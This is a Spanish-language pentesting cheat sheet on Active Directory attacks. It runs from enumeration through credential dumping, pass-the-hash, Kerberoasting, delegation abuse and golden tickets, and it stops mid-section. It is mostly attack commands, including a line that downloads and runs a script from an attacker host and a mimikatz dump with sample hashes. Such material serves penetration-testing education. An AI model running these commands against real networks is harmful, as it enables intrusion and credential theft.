
# Enumeracion y acceso inicial

Esta seccion abarcara tecnicas de enumeracion desde fuera del entorno AD pasando por la validacion de usuarios y password minning hasta conseguir el acceso inicial.

## Índice
* [Herramientas](#Herramientas)
* [NMAP](#NMAP)
* [Enumeracion de usuarios](#Enumeracion-de-usuarios)
  * [SMB](#SMB)
  * [RPC](#RPC)
  * [LDAP](#LDAP)
  * [HTTP & HTTPS](#HTTP-&-HTTPS)
* [Validacion de usuarios](#Validacion-de-usuarios)
  * [Kerberos](#Kerberos)
  * [Crackmapexec](#Crackmapexec)
* [Obtencion de credenciales & hashes](#Obtencion-de-credenciales-&-hashes)
* [Dumpeo de estructura del AD](#Dumpeo-de-estructura-del-AD)
* [Acceso inicial](#Acceso-inicial)

## Herramientas
* Impacket 
* [Responder](https://github.com/SpiderLabs/Responder)

````
responder -I <interfaz> --lm -v
````
* Mimikatz
* CrackMapExec
* [Kerbrute](https://github.com/ropnop/kerbrute/releases)
* [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
* [GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) & [GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
* [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
* [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
  
````
IEX((New-Object Net.WebClient).DownloadString('https://<KALIIP/SharpHound.ps1>')
Invoke-Bloodhound -CollectionMethod All
````
* [Secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

## NMAP 

Al hacer un escaneo de puertos en un entorno de Active Directory en especial si el escaneo lo hacemos directamente contra el Domain Controller nos encontraremos los siguientes puertos:

+ TCP/UDP port 53: DNS
+ TCP/UDP port 88: Kerberos authentication
+ TCP/UDP port 135: RPC
+ TCP/UDP port 137-138: NetBIOS
+ TCP/UDP port 389: LDAP
+ TCP/UDP port 445: SMB
+ TCP/UDP port 464: Kerberos password change
+ TCP/UDP port 636: LDAP SSL
+ TCP/UDP port 3268-3269: Global catalog

Adicionalmente dependiendo del entorno AD este puede tener varias caracteristicas y componentes asi como interactuar con diferentes servicios y aplicaciones por lo que podemos encontrarnos mas puertos comunes:

+ TCP port 80: HTTP
+ TCP port 443: HTTPS
+ TCP port 445: SMB

De modo que tenemos dos maneras de conseguir acceso inicial al AD:
1. Autenticandonos en alguno de los servicios
2. Explotando las vulnerabilidades de alguna aplicacion o servicio corriendo en el entorno AD

## Enumeracion de usuarios
### SMB

````bash
nmap -p 445 --script=smb-enum* <TARGET>  # Principalmente nos interesa enumerar usuarios
nmap -p 445  --script=smb-vuln* <TARGET> # MS17-010, MS14-025
````

* SMBMap
````bash
smbmap -H <TARGET>
````

* smbclient
````bash
smbclient -L <TARGET> -N
````

* CrackMapExec
````bash
# Escaneo del target 
crackmapexec smb www.secbank.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb <TARGET> -u "" up ""

# Connect to target using local account
crackmapexec smb <TARGET> -u 'test' -p 'pass123' --local-auth

# Pass the hash contra subredes
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Fuerza bruta y Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
````

````bash
# Enumeración de usuarios
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --users

# Enumeracion de grupos de dominio
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --groups

# Enumeracion de usuarios locales
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --local-users

# Enumeracion de recursos compartidos locales
crackmapexec smb <TARGET> -u 'user' -p 'PASSWORD' --local-auth --shares

# Sesiones activas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --sessions

# Usuarios logeados
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --lusers

# Politica de contraseñas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --pass-pol
````

````bash
# Dump local SAM hashes
crackmapexec smb <TARGET> -u 'Administrator' -p 'PASS' --local-auth --sam

# Dump the NTDS.dit from DC using methods from secretsdump.py
crackmapexec smb <TARGET> -u UserNAme -p 'PASSWORDHERE' --ntds
````
### RPC

Null session

`rpcclient -U "" <TARGET> -N`

Autenticacion

`rpcclient -U "user%password" <TARGET>`

Enumeracion de usuarios y grupos
````bash
enumdomusers
enumdomgroups
queryuser <0xuser>
querygroupmem 0x200 # Miembros del grupo Domain Admins
rpcclient -U "" <TARGET> -N -c "enumdomusers" # One line comand
````
Enumeracion de impresoras

`enumprinters`

Enumeracion de descripciones

`rpcclient -U "" <TARGET> -N -c "querydispinfo"`

### LDAP

Lo primero es dumpear toda la informacion que contiene LDAP, buscaremos el DomainNamingContext el cual necesitaremos para otros comandos

````bash
nmap -n -sV --script "ldap* and not brute" <TARGET>
ldapsearch -x -b "dc=domain,dc=local" "*" -H "ldap://TARGET"
````

A partir de aqui podemos seguir enumerando con ldapsearch el cual nos permitira filtrar por los distintos campos de la informacion almacenada

````bash
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep sAMAccountName: # Enumeracion de las cuentas de usuario
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=hutch,DC=offsec" | grep description # Enumeracion de las descripciones de los usuarios las cuales en ocasiones contienen informacion sensible
````
Para enumerar constraseñas necesitamos dar con el nombre correcto del campo que las contiene, algunos ejemplos:

````bash
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep Pwd
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep userPassword
````
Teniendo unas credenciales validas podriamos acceder a credenciales de mas alto nivel como las de administrador
````
ldapsearch -D <user>@domain.local -w <password> -o ldif-wrap=no -b 'dc=domain,dc=local' -h domain.local "(ms-MCS-AdmPwd=*)" ms-Mcs-AdmPwd
````

### HTTP & HTTPS
Al realizar la fase de reconocimiento web podemos descubrir una vulnerabilidad en la aplicacion que esta corriendo en uno de los equipos del dominio y permitirnos un acceso inicial a este, pero en otras ocasiones podemos enumerar usuarios bien en el contenido de la pagina o en paneles de login que permitan enumerar usuarios a traves de logins fallidos.

Cuando los usuarios no estan claramente definidos en el contenido web como una seccion de Contact o About Us puede que los nombres de estos coincidan con alguna palabra del contenido, en ese caso usaremos cewl para crear una wordlist personalizada. Esta wordlist posteriormente nos servira para validar usuarios contra kerberos o hacer fuerza bruta con ellos.

````bash
cewl -w wordlist.txt "http://www.test.com/index.php" --with-numbers
````

Tambien se puede dar el caso en el que los nombres de usuario esten claramente definidos en la web con formato Nombre Apellido y que haya que adaptarlo al formato que sea valido para el login. 

> Ejemplo: David Jhons -> david.johns d.jhons

Para esto podemos usar dos herramientas que nos facilitaran el proceso haciendo estas combinaciones automaticamente:

* [spindrift](https://github.com/byt3bl33d3r/SprayingToolkit)
````bash
python3 spindrift.py users.txt --format {f}{last}
python3 spindrift.py users.txt --format {f}.{last}
python3 spindrift.py users.txt --format {first}.{last}
python3 spindrift.py users.txt --format {first}{l}
python3 spindrift.py users.txt --format {first}.{l}
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/3e1dce0b-3aad-4aa0-8798-1325e62e5c4b)

* [cupp](https://github.com/Mebus/cupp)
````bash
python3 cupp.py -i   # Nos abrira una consola interactiva donde ira pidiendonos los datos
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/5c0d1adf-a902-494c-8695-bf657440c5f8)

> Tambien se pueden enumerar usuarios a traves de herramientas de enumeracion orientadas a CMS o aplicaciones web como WPscan o Drupescan

## Validacion de usuarios
### Kerberos
Kerbrute utiliza la fase de pre-autenticación para enumerar usuarios y hashes de contraseñas. En esta fase nos interesa validar todos los usuarios posibles.
> Podemos tener la lista de usuarios enumerados en otros servicios en los pasos anteriores o en caso de no tener ninguno hacer fuerza bruta con un diccionario de usuarios.

````
./kerbrute userenum --dc <TARGET> -d domain.local users.txt
./kerbrute userenum --dc <TARGET> -d domain.local SecLists/Usernames/xato-net-10-million-usernames.txt
````

### Crackmapexec
````
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"

````
## Obtencion de credenciales & hashes

El proceso de recoleccion de credenciales de autenticacion se podria clasificar en 4 metodos:
* Enumeracion de servicios con credenciales almacenadas de manera insegura
  * SMB
    * Reconocimiento de estructura SYSVOL y dumpeo de Groups.xml -> `Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`
    * Archivos con credenciales almacenadas
    * Copia de seguridad del SAM
  * Credenciales guardadas en la descripcion de los usuarios en RPC y LDAP
  * Credenciales guardadas en claves de registro
    
* Explotacion de preautenticacion de kerberos
  * AS-REP Roast
  ````bash
  GetNPUsers.py test.local/ -no-pass -usersfile usernames.txt
  ````
  * Kerberoasting
  ````bash
  GetUserSPNs.py test.local/john:password123
  GetUserSPNs.py test.local/john:password123 -request
  ````

 > Para realizar este ataque el puerto 88 de Kerberos debe estar expuesto, podemos encontrarnos escenarios en los que ya hayamos conseguido un acceso inicial y veamos un usuario kerberosteable pero el puerto 88 no este expuesto, para esto hay dos soluciones:

1. Hacer el kerberoasting desde dentro con Invoke-Kerberoast.ps1 o Rubeus.
2. Forwardear el puerto 88 hacia nuestra maquina atacante.
````
.\chisel.exe client 10.10.10.10:1234 R:88:127.0.0.1:88 R:389:127.0.0.1:389
````

* Conseguir una conexion del lado del servidor para obtener un hash de usuario
  * SSRF
  * SMB SCF attack
  * DNS Request
* Fuerza bruta
  * SMB CrackMapExec
  ````bash
  crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
  crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
  crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
  crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
  ````
  * RDP Crowbar
  ````bash
  crowbar -b rdp -s 10.11.1.24/32 -U userlist.txt -C passlist.txt
  ````
 ## Dumpeo de estructura del AD

 Una vez tenemos credenciales validas aunque sean de usuario con un nivel de privilegios bajo nos permitira obtener informacion importante del AD

 * Bloodhound-python
  ````bash
  bloodhound-python -c All -u <user> -p <password> -ns <host> -d test.local
  ````
 * ldapdomaindump

 > Esta herramienta nos permitira ver de una manera ordenada y visual los usuarios y grupos del dominio, además aporta informacion importante ya que podremos identificar los usuarios pertenecientes al grupo Domain Admins o al grupo de administracion remota de windows.

  ````bash
  ldapdomaindump -u test.local\<user> -p '<password>' <TARGET>
  ````
 * Claves de registro
  ````bash
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM
    reg.py -hashes :<hash> test.local/john:@10.10.10.1 query -keyName HKLM

    # Key names
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKCU
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKCR
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKU
  ````
 * SAM
 ````bash
 crackmapexec smb <TARGET> -u 'Administrator' -p 'PASS' --local-auth --sam   # Normalmente esto requerira el nivel de privilegios de un usuario Administrador
 ````

## Acceso inicial

Anteriormente hemos dicho que hay dos maneras de lograr un acceso inicial en un entorno de AD
1. Autenticandonos en alguno de los servicios
2. Explotando las vulnerabilidades de alguna aplicacion o servicio corriendo en el entorno AD

### Explotacion de vulnerabilidades

* Web App
* SMB
  * MS17-010
* Phishing
  * Documento con macros maliciosos via Mail/FTP
    * ODT File
    * Office file
  * SMB
    * SCF file

### Autenticacion con credenciales/hashes

Evil-WinRM
````bash
evil-winrm -i 10.10.10.1 -u john -p password123
evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
````
Ademas, esta herramienta tiene multitud de modulos que nos facilitan transferir archivos y herramientas a la maquina victima, invocar binarios de powershell y bypassear el AMSI.

![image](https://github.com/n3masyst/Pentesting/assets/133997401/8111695e-b1a9-4160-b8d0-c51b87d4663b)

RDP
````bash
rdesktop <ip> -u <user> -p <password>
xfreerdp /v:<ip> /d:<domain> /u:<user> /p:<password>
xfreerdp /v:<ip> /d:<domain> /u:<user> /pth:<hash>
````
psexec
````bash
psexec.py <user>:<password>@<ip>
psexec.py -hashes ":<hash>" <user>@<ip>

export KRB5CCNAME=/full/path/to/john.ccache; psexec.py test.local/john@10.10.10.1 -k -no-pass # Autenticacion con ticket de kerberos exportado
````
wmiexec
````bash
wmiexec.py test.local/john:password123@10.10.10.1
wmiexec.py test.local/Administrator@10.10.10.1 -hashes :f6b7160bfc91823792e0ac3a162c9267

wmiexec.py <ip> -k -no-pass # Autenticacion con ticket de kerberos exportado
````
pth-winexe
````bash
pth-winexe -U <DOMINIO>/usuario%contraseña //<IP> cmd
pth-winexe -U <DOMINIO>/usuario%hash //<IP> cmd
````

## Escalada de privilegios

### Bloodhound

En esta seccion se describiran los vectores de escalada mas comunes enumerados por Bloodhound asi como el abuso de ACLs

Algunos de los permisos y tipos de objetos de Active Directory que a nosotros, como atacantes, nos interesan:

- GenericAll - permiso total sobre el objeto (añadir usuarios a grupos o resetear contraseñas)
- GenericWrite - actualiza atributos de objetos (i.e logon script)
- WriteOwner - cambiar el propietario del objeto para que el usuario controlado por el atacante se haga cargo del objeto
- WriteDACL - modificar las ACE del objeto y otorgar al atacante control total sobre el objeto
- AllExtendedRights - capacidad de agregar un usuario a un grupo o restablecer la contraseña
- ForceChangePassword - capacidad de cambiar la contraseña del usuario
- Self (Self-Membership) - posibilidad de agregarse a un grupo
  
#### DCSync
Normalmente podemos enumerar los derechos DCSync en Bloodhound de 3 maneras:
1. Menu > Pre-Built Analytics Queries > Find Principals with DCSync Rights
2. Una vez que tengamos el grafico de relaciones identificar el permiso GetChangesAll
3. Una vez que tengamos el grafico de relaciones identificar el permiso WriteDACL y otorgar a un usuario permisos DCSync

Una vez tengamos comprometido el usuario con dichos derechos podemos dumpear el SAM de dos maneras:

1. Desde dentro con mimikatz
````bash
lsadump::dcsync /domain:domain.local /user:Administrator
````

2. Desde fuera con secretsdump
````bash
secretsdump.py domain.local/<user>:<password>@<ip>
````

WriteDACL

> Este permiso permite a un usuario crear o eliminar usuarios o grupos asi como agregar o quitar usuarios de grupos, cambiar permisos de acceso, crear nuevos permisos entre otros...

Una vez tenemos un usuario con permisos WriteDACL o pertenecemos a un grupo de seguridad que lo tenga podemos otorgar derechos DCSync con Powerview de la siguiente manera:
````bash
$pass = convertto-securestring 'password' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('domain\<user>', $pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync
````
Con el derecho DCSync otorgado ya podemos dumpear el SAM con los metodos anteriores

#### ReadGMSAPassword

Este permiso permite la capacidad de leer las contraseñas del grupo Managed Service Account (MSA) las cuales son cuentas de servicio gestionadas automaticamente por el sistema operativo.

Enumeracion

El permiso en cuestion lo podemos enumerar de dos maneras:
1. Esquema de Bloodhound
2. Manualmente con powershell
````bash
Get-ADServiceAccount -Identity '<user>' -Properties 'msDS-ManagedPassword'
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/88c61451-a63d-4c3a-8c6f-d8000427b005)

La contraseña se nos presenta en formato bytearray, para leer el bytearray completo y por lo tanto confirmar que tenemos permiso para leer la contraseña MSA usaremos el siguiente comando:
````bash
(Get-ADServiceAccount -Identity '<user>' -Properties 'msDS-ManagedPassword').'msDS-ManagedPassword'
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/f732f3e0-33d0-4fbf-93c7-c80aa48d6f66)

Explotacion

Para dumpear estas contraseñas podemos usar 2 herramientas
* [GMSAPasswordReader.exe](https://github.com/rvazarkar/GMSAPasswordReader)
Esta herramienta nos dara el hash NTLM del usuario con el que podremos autenticarnos
````bash
.\GMSAPasswordReader.exe --accountname <user>
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/fc81087f-29b8-49eb-bbab-402069dd5fbc)

* [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper)
Esta herramienta nos permitira dumpear los hashes MSA asi como obtener el hash NTLM de autenticacion a partir de crackear el bytearray anterior el cual ira hardcodeado en el codigo de la herramienta.

Metodo 1
Este metodo requerira de un paso extra para obtener el NTLM de autenticacion del usuario ya que el hash que devuelve no es de autenticacion.
````bash
python3 gMSADumper.py -u '<user>' -p '<password>' -l <ip> -d test.local
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/3f04e52f-a11f-42ba-843d-7631964d66ee)

El hash que obtenemos de la cuenta de servicio no nos sirve para autenticarnos por lo que necesitaremos crear un ticket SPN a partir de el. Para ello usaremos la herramienta getST.py

Para obtener el ticket necesitamos aportarle los siguiente datos 

- `-dc-ip 10.10.10.1`
- `-spn www/dc.test.local` - el SPN podemos obtenerlo en la pestaña Node Info de Bloodhound o con la herramienta pywerview
- `-hashes :5e47bac787e5e1970cf9acdb5b316239` - el NTLM anterior
- `-impersonate administrator` - el usuario del que quiero el ticket
- `test.local/svc_int` - la cuenta actual

````bash
getST.py -spn WWW/dc.test.local -impersonate Administrator test.local/svc_int -hashes :fb49fcd5ffc6fefa70503e08c9cd8261
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/bbba38e2-10ab-4dbd-a79f-6ff66d61d01d)

Obtendremos un ticket TGT valido el cual podremos usar para autenticarnos usando algunos de los metodos de autenticacion de acceso inicial mencionados anteriormente.

Metodo 2

En caso de tener el bytearray de la contraseña mencionado anteriormente podemos hardcodearlo en la herramienta y esta nos lo crackeara dandonos el hash en formato NTLM valido para autenticarse.

````python
data =  [1,0,0,0,36,2,0,0,16,0,18,1,20,2,28,2,181,165,82,94,231,248,193,148,89,124,204,111,76,59,48,129,55,158,201,157,255,80,32,6,126,97,84,66,219,80,85,150,223,28,16,48,182,243,11,169,40,190,102,229,143,46,89,192,35,51,0,53,18,225,2,200,215,94,130,245,131,117,147,164,159,214,199,70,76,109,240,8,194,58,138,122,10,111,151,192,253,10,156,15,98,45,216,246,234,253,136,240,182,211,31,207,90,74,59,22,94,104,11,136,52,198,149,111,201,47,26,174,149,63,79,16,233,59,75,133,74,96,134,222,75,138,228,23,235,83,202,126,115,186,136,71,27,88,114,169,216,200,233,218,223,30,240,225,12,185,104,201,251,33,145,84,168,232,251,253,85,255,134,35,253,3,4,25,170,79,32,219,120,33,34,169,111,226,123,243,55,159,121,129,88,84,27,6,245,29,154,21,218,103,94,201,86,184,130,100,96,134,45,130,253,145,84,22,240,189,2,128,17,2,138,241,217,21,216,242,191,86,158,206,238,180,153,72,44,248,217,91,200,147,71,216,111,123,10,185,37,14,61,18,167,163,241,221,139,254,47,56,180,186,160,165,0,0,131,193,78,147,51,246,57,83,121,181,169,112,213,179,71,35,167,129,148,70,243,140,4,40,195,38,224,13,7,73,120,250,9,46,25,119,59,151,213,50,120,212,133,32,220,211,182,23,99,142,178,23,72,232,103,103,71,26,39,104,199,246,8,17,237,58,60,188,248,80,93,232,20,3,68,207,7,102,151,207,13,179,62,127,89,232,112,101,122,237,125,201,44,15,125,41,148,234,18,144,199,137,8,63,197,218,8,14,220,122,98,22,45,244,214,78,125,171,126,3,122,246,195,125,83,24,93,225,241,120,17,186,196,226,170,251,135,144,113,197,154,31,71,7,128,3,222,80,106,238,60,192,109,167,223,239,128,129,151,207,32,237,228,235,30,66,58,215,220,136,46,136,59,227,227,102,53,102,191,200,91,64,253,140,198,90,133,2,33,209,61,209,223,214,179,172,7,177,75,79,200,80,66,130,21,89,107,33,254,73,209,70,178,37,238,70,250,72,143,157,215,242,77,59,111,109,9,158,60,196,210,92,16,191,219,150,77,80,180,153,34,193,33,202,165,58,156,50,174,92,199,68,136,133,58,125,0,0,177,129,38,95,103,7,0,0,177,35,86,172,102,7,0,0]
data = bytes(data)
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/9a879c43-cbe2-439e-bdf5-9de646b1c92b)

#### ForceChangePassword
>Este privilegio permite forzar el cambio de contraseña a usuarios del dominio, podemos explotarlo con PowerView de la siguiente manera:

````bash
$newpass = ConvertTo-SecureString 'hacker123$!' -AsPlainText -Force   # La contraseña de cumplir las politicas presentes en el AD por lo que es bueno asegurarse poniendo una compleja.
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
````

#### GenericWrite

> Este permiso otorga un conjunto genérico de derechos para realizar operaciones de escritura en un objeto o recurso en el sistema.

Se puede explotar realizando un ataque de kerberoasting con PowerView

1. Primero debemos crear un SPN para el usuario con el permiso.
````bash
# Podemos usar Set-DomainObject o setspn
Set-DomainObject -Identity <user> -SET @{serviceprincipalname='nonexistent/0XDF'}
setspn -a MSSQLSvc/domain.local:1433 domain.local\<user> # Este es el formato valido de SPN

# Vemos si se ha otorgado
Get-DomainUser <user> | Select serviceprinciplename
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/2ab1c5c2-a21e-4f2c-a43b-47d9e200f4f8)

2. Creamos el ticket SPN 

> Para realizar el kerberoast necesitamos un SPN con un [formato valido](https://learn.microsoft.com/en-us/windows/win32/ad/name-formats-for-unique-spns)
`{domain.local/john.domain.local:1337, nonexistent/0XDF}`

> Poweview tiene la utilidad Get-DomainSPNTicket para realizar el kerberoast pero requiere un objeto de credencial independientemente que nos encontremos en la sesion del usuario.

````bash
$pass = ConvertTo-SecureString 'hacker123$!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('domain.local\<user>', $pass)
Get-DomainSPNTicket -SPN "MSSQLSvc/domain.local:1433" -Credential $Cred
````

> Este proceso tambien se puede explotar para el permiso GenericAll

### Constrained delegation

> Las "Unconstrained Delegations" (Delegaciones sin restricciones) son un componente de la infraestructura de seguridad en sistemas Windows y Active Directory que permite que un servidor delegue sus credenciales de autenticación a otro servidor sin restricciones ni verificaciones de seguridad adicionales. Esto significa que el servidor receptor puede utilizar las credenciales del usuario que ha iniciado sesión en el servidor delegador sin necesidad de autorización explícita.

#### Resource-based Constrained Delegation

> Esto es similar a las Constrained delegation básicas, pero en lugar de otorgar permisos a un objeto se hace pasar por cualquier usuario frente a un servicio. La Constrained delegation basada en recursos establece en el objeto quién puede hacerse pasar por cualquier usuario.

Explotacion

1. Primero debemos crear un nuevo "Computer Object", podemos hacerlo con varias herramientas o comandos

- [Powermad](https://github.com/Kevin-Robertson/Powermad)
 ````bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ````
- [StandIn.exe](https://github.com/FuzzySecurity/StandIn/releases)
 ````bash
 .\StandIn.exe --computer xct --make
 ````
- impacket-addcomputer
 ````bash
 impacket-addcomputer domain.local/<user> -dc-ip <ip> -hashes :<userhash> -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
 impacket-addcomputer domain.local/<user>:<password> -dc-ip <ip> -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
 ````
> Este ultimo permite hacerlo desde la maquina atacante con el requisito de disponer las credenciales del usuario. Los dos primeros usan las sesion del usuario actual.

2. Confirmamos la creacion del objeto con `Get-ADComputer`
````bash
Get-ADComputer <computer_name>
Get-ADComputer -Filter * | Select-Object Name, SID

# PowerView
Get-DomainComputer <computer_name>   
````

3. Asignar permisos de delegacion 

> msDS-AllowedToActOnBehalfOfOtherIdentity (conocido como "Constrained Delegation" o "Delegación restringida"): Este atributo se utiliza para permitir que una cuenta de servicio delegue sus credenciales para actuar en nombre de otra cuenta de usuario o servicio específico. La delegación restringida es más segura y permite limitar a qué cuentas o servicios se pueden delegar las credenciales, lo que disminuye el riesgo de abuso. Por lo tanto, este atributo se utiliza para configurar la delegación segura en Active Directory.
> PrincipalsAllowedToDelegateToAccount (conocido como "Unconstrained Delegation" o "Delegación sin restricciones"): Este atributo se utiliza en servidores para permitir que una cuenta delegue sus credenciales sin restricciones. La delegación sin restricciones es menos segura, ya que permite que las credenciales se deleguen sin restricciones de tiempo o lugar, lo que potencialmente expone a la red a riesgos de seguridad. Se utiliza en situaciones en las que se necesita una delegación amplia sin restricciones, como aplicaciones antiguas que no son compatibles con la delegación restringida.

- Powershell
````bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount COMPUTER1$ 
Set-ADComputer $targetComputer -msDS-AllowedToActOnBehalfOfOtherIdentity COMPUTER1$ 
````
- [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py)
````bash
# Esta herramienta solo asigna el atributo msDS-AllowedToActOnBehalfOfOtherIdentity
python3 rbcd.py -dc-ip <ip> -t <DC_name> -f '<computer_name>'  <DC_name>\\<user>:<password>
python3 rbcd.py -dc-ip <ip> -t <DC_name> -f '<computer_name>' -hashes :<user_hash> <DC_name>\\<user>
````
- PowerView
````bash
$ComputerSid = Get-DomainComputer COMPUTER1 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}  /// Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'PrincipalsAllowedToDelegateToAccount'=$SDBytes}
````
4. Comprobar asignacion correcta
````bash
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
Get-ADComputer $targetComputer -Properties msds-allowedtoactonbehalfofotheridentity
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount |select -expand PrincipalsAllowedToDelegateToAccount
Get-ADComputer $targetComputer -Properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

# PowerView
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
Get-DomainComputer $targetComputer -Properties 'PrincipalsAllowedToDelegateToAccount'
````

5. Conseguir un SPN de Administrador
Una vez podemos impersonarnos con la cuenta de maquina que acabamos de crear y asignar delegacion, conseguiremos el ticket SPN del Administrador guardado en los otros servidores donde este se ha logueado.

````bash
impacket-getST -spn cifs/domaindc.domain.local domain/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 10.10.10.1
````

> El ticket se exportara a nuestra cache y podremos autenticarnos mediante los metodos de acceso inicial anteriores (psexec/wmiexec -k -no-pass)

### Kerberoasting

Extraccion de tickets de kerberos

#### Invoke-Kerberoast.ps1
````bash
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/7ffc22ad-e5cc-47e2-badc-051d403f2c59)

#### Rubeus.exe

- Obtener TGT de un usuario
````bash
.\Rubeus.exe asktgt /user:<user> /password:<password>
.\Rubeus.exe asktgt /user:<user> /rc4:<hash>
````

- Crear TGS a partir de TGT
````
.\Rubeus.exe asktgs /user:<user> /ticket:<tgt_ticket> /service:LDAP/dc1.test.local
.\Rubeus.exe klist  # Lista todos los tickets existentes
.\Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt  # Fuerza bruta
````

- Dump
````
.\Rubeus.exe dump
.\Rubeus.exe dump /service:krbtgt
.\Rubeus.exe tgtdeleg
.\Rubeus.exe tgtdeleg /nowrap  # En este caso al no presentar credenciales Rubeus nos devolvera hashes del sistema que no sean usuarios del dominio.
````

- Pass the ticket
````
.\Rubeus.exe ptt /ticket:<ticket>
````

- Kerberoast
````
.\Rubeus.exe kerberoast /spn:dc1.test.local/test.local   # Obtiene todos los TGS presentes en el SPN especificado
.\Rubeus.exe kerberoast /creduser:test.local\<user> /credpassword:<password>  # Obtiene el TGS del usuario especificado
````

- ASREPRoast
````
.\Rubeus.exe asreproast /spn:dc1.test.local/test.local
````

### Golden Tickets
Crear el golden ticket e inyectarlo en la memoria no requiere ningún trámite administrativo. privilegios, e incluso se puede realizar desde una computadora que no está unida al dominio. 

Primero borramos todos los tickets existentes de kerberos 

``kerberos::purge``

A continuacion generaremos el golden ticket, podemos usarlo en la propia maquina para escalar privilegios mediante un pass the ticket o podemos exportarlo y llevarlo a otra maquina para pivotar.


1. Escalada Local

Primero obtenemos el hash de krbtgt 

```bash
mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668
RID : 000001f4 (500)
User : Administrator
LM :
NTLM : e2b475c11da2a0748290d87aa966c327
RID : 000001f5 (501)
User : Guest
LM :
NTLM :
RID : 000001f6 (502)
User : krbtgt
LM :
NTLM : 75b60230a2394a812000dbfad8415965
```

Creamos el golden ticket

``mimikatz # kerberos::golden /user:fakeuser /domain:test.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt``

El parametro /ptt permite que inyecte el golden ticket en memoria de manera que ya tendriamos privilegios de administrador

2. Exportar para pivotar

